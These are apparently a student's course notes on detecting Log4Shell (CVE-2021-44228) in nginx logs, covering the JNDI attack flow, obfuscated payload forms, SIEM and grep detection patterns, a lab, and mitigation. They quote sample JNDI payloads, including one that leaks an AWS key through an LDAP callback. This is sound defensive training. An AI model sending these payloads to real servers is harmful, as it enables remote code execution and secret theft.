# Section 5: Detecting Log4Shell Attack

> Part of my **Web Attack Detection and Analysis** course notes. See the [README](../README.md) for all sections.

## Overview

This section covers **Log4Shell (CVE-2021-44228)**, a critical vulnerability in the Apache Log4j logging library. It focuses on how the attack works, how to recognize it in web server logs (including obfuscated payloads), how to write detection rules, and how to mitigate it.

| Topic | Lab |
|---|---|
| What Log4Shell is and how it works | Log4Shell log analysis (nginx `access.log`) |
| Payloads, probes and information leakage | |
| Detection rules, grep and regex | |
| Mitigation | |

> ### Corrections to the course material
> A few parts of the course text are inaccurate or belong to a different vulnerability. I've corrected them in these notes:
> - **"Check if you're vulnerable" and the Spring/Tomcat patch versions describe Spring4Shell (CVE-2022-22965), not Log4Shell.** The JDK 9+, Tomcat, WAR packaging and `spring-webmvc` conditions, and the Spring 5.3.18 / Tomcat 10.0.20 style fixes, are for that separate vulnerability. Log4Shell depends on the **Log4j version**, so see the corrected version and mitigation sections below.
> - **Affected versions:** Log4Shell affects Log4j 2.x from **2.0-beta9 through 2.14.1**. Log4j 1.x is not affected by this CVE (it has other issues).
> - **Serialization vs deserialization:** the course defines deserialization as converting an object into a byte stream. That is **serialization**; deserialization is the reverse.
> - **Root cause:** the core flaw is the **JNDI lookup feature in log message handling**, which makes Log4j fetch data from an attacker-chosen server. Loading and running the returned class is what turns that into code execution.

---

## 1. What is Log4Shell?

- **Log4j** is a widely used Java logging library. Developers use it to write log messages from their applications.
- **Log4Shell** is a vulnerability in Log4j (disclosed December 2021, **CVE-2021-44228**) that allows **remote code execution**.
- **CVSS score: 10.0**, the highest possible severity.
- It isn't a program that can be targeted directly. It is a flaw in a library, so any application or system that **includes a vulnerable Log4j version and logs attacker-controlled text** can be exposed. That's why it affected such a huge number of systems.

**Impact of successful exploitation:** remote code execution, unauthorized access, privilege escalation, theft of sensitive data (including cloud keys held in environment variables), and further attacks depending on the application's permissions.

---

## 2. How the attack works

Log4j supports **lookups**: special `${...}` expressions inside log messages that are replaced with a value at runtime. One lookup type is **JNDI** (Java Naming and Directory Interface), which can query services such as **LDAP** or **DNS**. In vulnerable versions, this was applied to the **content of log messages**, including text sent by the attacker.

**Attack flow**
1. The attacker sends a request containing a string like `${jndi:ldap://attacker-server/a}` in a field the application will **log** (for example the **User-Agent** header, a URL parameter or a form field).
2. The vulnerable application writes that text to its log. Log4j sees the `${jndi:...}` expression and **performs the lookup**.
3. The server connects out to the **attacker-controlled** address.
4. The attacker's server responds with a reference to a **remote Java class**.
5. The vulnerable process loads it, and the attacker's code runs with the **application's privileges**.

The course notes that this JNDI attack idea was presented at Black Hat USA 2016.

**Where payloads can appear:** any field that gets logged. Headers such as **User-Agent** are common, but also the URL, query parameters, POST data and other headers.

---

## 3. Payloads, probes and information leakage

### Out-of-band (callback) probes
Attackers and testers check whether a target is vulnerable by making it **send a DNS request to a domain they control**. If the domain's DNS logs show a request, the target processed the payload. Free callback services mentioned in the course include **Canarytokens, interactsh, Burp Collaborator and dnslog**.

Because every request can use a **unique subdomain**, the attacker can tell **which target** made the callback.

### Information leakage through lookups
Lookups can insert **local values into the DNS name**, so the data leaks out in the DNS query. The course lists lookup types that can reveal:

| Lookup | Example information |
|---|---|
| `env:` | environment variables (including cloud credentials such as AWS access key variables) |
| `sys:` | Java system properties (e.g. Java version, vendor) |
| `java:` | Java runtime and OS information |
| `hostName` | the server's hostname |
| `docker:`, `web:` | container ID, web root directory |
| `file:` | file contents |

Why this matters for a SOC: even when no code execution happens, **secrets in environment variables can leak**, and cloud credentials can then be used to compromise the cloud environment.

### Obfuscation
Detection gets harder because the `${jndi:` text can be **disguised** so simple string searches miss it:
- **URL-encoding** and double encoding (`%24%7bjndi`, `%2524%257bjndi`)
- **Nested lookups** that build the letters (for example `${lower:j}`, `${::-j}`, `${env:X:-n}`)
- **Base64** and other lookup wrappers
- Other protocols: `ldap`, `ldaps`, `rmi`, `dns`, `iiop`

---

## 4. Detecting Log4Shell

### Key indicators
- The string **`jndi:`** with a protocol (`ldap`, `ldaps`, `rmi`, `dns`, `iiop`) in any request field
- Encoded forms: `%24%7bjndi`, `$%7bjndi`, `%2524%257bjndi`, `%2F%252524%25257Bjndi%3A`
- Obfuscated forms: `${jndi:${lower:`, `${::-j}${...`, `${base64:JHtqbmRp...`
- **Lookup expressions** such as `${env:...}` or `${sys:...}` appearing in request data, which normal users don't send
- **Unusual outbound DNS or LDAP connections** from servers to unknown domains
- Repeated requests from the same IP with **changing unique subdomains**

### SIEM / WAF detection rule
The course's rule checks the **header, POST data and URL fields** for these patterns (any match means a potential Log4Shell attempt):

```
${jndi:ldap:/    ${jndi:rmi:/    ${jndi:ldaps:/    ${jndi:dns:/
/$%7bjndi:       %24%7bjndi:     $%7Bjndi:
%2524%257Bjndi   %2F%252524%25257Bjndi%3A
${jndi:${lower:  ${::-j}${       ${jndi:iiop
${::-l}${::-d}${::-a}${::-p}     ${base64:JHtqbmRp
```

### Searching nginx logs with grep
The course gives one very long regex. These shorter commands are easier to read and maintain (I tested them on sample lines). Use `-i` because the nested lookups are case-insensitive.

```bash
# 1. Plain payloads
grep -iE 'jndi:(ldap|ldaps|rmi|dns|iiop)' access.log

# 2. URL-encoded payloads
grep -iE '%24%7bjndi|%2524%257bjndi|\$%7bjndi' access.log

# 3. Broad search including obfuscated payloads
grep -iE 'jndi|\$\{(::-|lower:|upper:|env:|sys:|base64:)|%24%7b|%2524%257b' access.log

# 4. Which IPs are sending them?
grep -iE 'jndi|\$\{(::-|lower:|upper:|env:|sys:|base64:)|%24%7b|%2524%257b' access.log \
  | awk '{print $1}' | sort | uniq -c | sort -rn

# 5. Which header carried the payload?
#    In the combined log format, the 4th quote-separated field is the Referer
#    and the 6th is the User-Agent
grep -i 'jndi' access.log | awk -F'"' '{print "REFERER:", $4, "| USER-AGENT:", $6}'
```

> **Note:** the broad search (3) can produce some false positives, so review the matches. Also, a WAF or log search finds the **attempt**. It doesn't prove the server was exploited.

### Example nginx log entry (from the course)
```
10.0.2.50 - - [13/Jul/2023:12:45:18 +0000] "GET /search.php?q=*&jndi=ldap%3A%2F%2F${env:AWS_ACCESS_KEY_ID}.exampledomain.com%2Fa HTTP/1.1" 200 815 "-" "Mozilla/5.0 ..."
```
- A GET request to `/search.php` with a `jndi=ldap://...` value in the query string.
- The payload tries to place the **AWS access key ID environment variable** into the lookup address, which would leak it through the DNS/LDAP request.
- It is a **potential Log4Shell attack** and a data exfiltration attempt.

### Did the attack succeed?
An access log shows the **attempt**, not whether the server made the lookup. To judge success, also check:
- **DNS logs / resolver logs** for queries from the web server to the payload's domain
- **Firewall / egress logs** for outbound LDAP, RMI or DNS connections from the server
- Endpoint logs for new processes started by the Java application
- The application's own logs (the payload is written there)

A `200` response doesn't mean the attack worked or failed, because the lookup happens when the text is **logged**, not necessarily when the response is generated.

---

## 5. Mitigation

> The course's patch list (Spring 5.3.18 / 5.2.20, Tomcat 10.0.20 / 9.0.62 / 8.5.78, Spring Boot 2.5.12 / 2.6.6) is for **Spring4Shell**, not Log4Shell.

For Log4Shell:
- **Upgrade Log4j 2** to a fixed release. 2.15.0 was the first fix, and later releases (2.16.0, 2.17.x and newer) fixed follow-on issues. Always check the **official Apache Log4j security page** for the current recommended version.
- Find **every** place Log4j is used, including libraries and third-party products that bundle it (use an inventory or an SBOM).
- If you can't patch immediately, apply the vendor's temporary workarounds (for example disabling lookups or removing the `JndiLookup` class), knowing these are less reliable than upgrading.
- **Restrict outbound traffic** from servers (egress filtering), especially LDAP, RMI and DNS to the internet, so a lookup can't reach an attacker.
- Add **WAF / IDS rules** for the indicators above, and monitor logs and DNS.
- Don't keep secrets such as cloud keys in environment variables where possible, and run applications with **least privilege**.
- Stay up to date with vendor advisories and coordinate with development and operations teams.

---

## 6. Lab: Log4Shell log analysis

**Environment:** a Linux VM with one nginx `access.log` in `Desktop/QuestionFiles`. It's a large file (thousands of lines) where the first part is ordinary traffic and the attack requests appear further down.

**Tasks**
- Identify the **DNS server (callback domain)** used in the Log4Shell payloads.
- Identify the **environment variable** used in one of the payloads.
- Identify which **HTTP header** was attacked.

**How I approached it**
- Opened the log in a text editor and searched for `jndi`, which highlighted the payload lines.
- Looked at the payloads to find the part after the lookup protocol (the callback domain) and any `${env:...}` lookup.
- Checked which field of the log line contained the payload (request line, Referer or User-Agent).

**Observations**
- Payloads appeared in **several places**: the **URL query string**, the **User-Agent** field (the last quoted field) and, in some entries, the quoted field before it (the **Referer** position). Check each field of the log line, not just the request.
- Many payloads were **obfuscated**, using nested `${lower:...}`, `${::-j}`-style lookups and URL-encoding, so a plain `jndi` search alone would miss some. This is why the broad grep in section 4 is useful.
- The **same domain** appeared repeatedly with a different random-looking subdomain in each request, consistent with callback tracking.
- Many of these requests returned **499** (an nginx status meaning the client closed the connection before the response), which fits automated scanning tools that don't wait for a response.

**Screenshots**

_Add your lab screenshots here: save them in the `images/` folder, then replace the example lines below._

<!--
![Lab files and access.log](images/log4shell-lab-01-files.png)
![Searching the log for jndi](images/log4shell-lab-02-jndi-search.png)
![Payload showing the callback domain](images/log4shell-lab-03-dns-domain.png)
![Payload using an environment variable lookup](images/log4shell-lab-04-env-variable.png)
-->

---

## Key takeaways

- Log4Shell is **text in a log message triggering a JNDI lookup** to an attacker-controlled server. Anything that gets logged can be an entry point.
- The **User-Agent header** is a classic place to hide it, but the URL and POST data are also used.
- **Obfuscation and encoding** are standard, so detection needs broad patterns and decoded values, not just one string.
- An access log shows **attempts**. To confirm exploitation, look at **DNS and outbound connection logs** from the server.
- The fix is **upgrading Log4j** (and finding every place it hides). Egress filtering limits the damage when something is missed.
- Check course material against other sources: here, the "vulnerable if" and patch sections were actually about **Spring4Shell**.

## Skills practised

Recognizing exploit payloads in web logs, decoding obfuscated and URL-encoded strings, building grep and SIEM detection patterns, identifying the attacked header and the callback infrastructure, judging attempt vs success, vulnerability mitigation planning.

---

*Previous: [Section 4: Hacked Web Server Analysis](../04-hacked-web-server-analysis/README.md) | Back to [README](../README.md)*
